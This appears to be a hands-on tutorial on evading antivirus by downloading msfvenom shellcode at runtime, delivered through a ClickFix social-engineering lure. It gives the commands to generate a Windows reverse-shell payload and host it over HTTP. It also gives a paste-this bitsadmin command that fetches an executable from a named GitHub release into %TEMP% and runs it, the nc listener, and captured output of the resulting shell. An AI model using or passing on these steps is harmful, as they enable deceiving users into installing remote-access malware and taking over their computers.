===========AV EVASION INTRO====================
NOTE: Storing SHell code as a hex string helps evading static AV signatures(sometimes)
- AV is a piece of software installed on a computer to block malicious exe fromrunning..
- Identifys if the software is malicious by "static" signatures or from the 
exe behaviours(sandbox or runtime)
* Static analysis usually looks at the hash of the executable when it hits the disk
and sometimes done in memory.
* Behaviour looks for certain behaviour at runtime. EG meterpreter trying to
migrate to process(DLL Payload) windows defender kills the session immediately.
* Sandbox evasion: AV runs the exe in an isolated environment to check if any malicious
behaviour arise before letting it run on host.
Note: This will not work on most modern EDRs. That's something I will go into more detail in the upcoming series.


==========2. Remove the shellcode from Payload============
- Shellcode payloads coming from MSfvenom are well documented and have static signatures.
- Start by removing the shellcode from initial payload.
- Host the actual payload remotely and download it at runtime.
Program/download.go
SetUp:
	We are using clickfix social engineering attack

1. Get a process ID that we will inject our payload e.g Notepad
2. Host our generated msfvenom payload from the attacker machine(in real world scenario use github releases)
	kali> msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.108 LPORT=4444 -f raw -o basic_reverse.raw
N/B: If using ngrok use the external details for IP and port.
	kali> python -m http.server 9000
url: http://192.168.1.108:9000/basic_reverse.raw ----> this will be in our payload. Realworld we host on github

3. Now start the listener on attacker machine
	kali> nc -nlvp 4444
4. Run the Clickfix
* win+R
* type cmd
* Paste whats on the clipboard to fix
	cmd>> bitsadmin /transfer myJob /download /priority foreground "https://github.com/ALLann123/C2--Infrastructure/releases/download/v1.0.0/custom_runner.exe" %TEMP%\me.exe && start %TEMP%\me.exe

	https://github.com/ALLann123/C2--Infrastructure/releases/download/v1.0.0/custom_runner.exe
* Enter to fix the error

5. On Attacker machine
********************************************************************
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.1.108] from (UNKNOWN) [192.168.1.106] 61172
Microsoft Windows [Version 10.0.19045.6466]
(c) Microsoft Corporation. All rights reserved.

C:\Users\user\Desktop>whoami
whoami
desktop-lsf7uhq\user
********************************************************************

NOTE: Antivirus allows the program to run but highlights a potential program it should report.
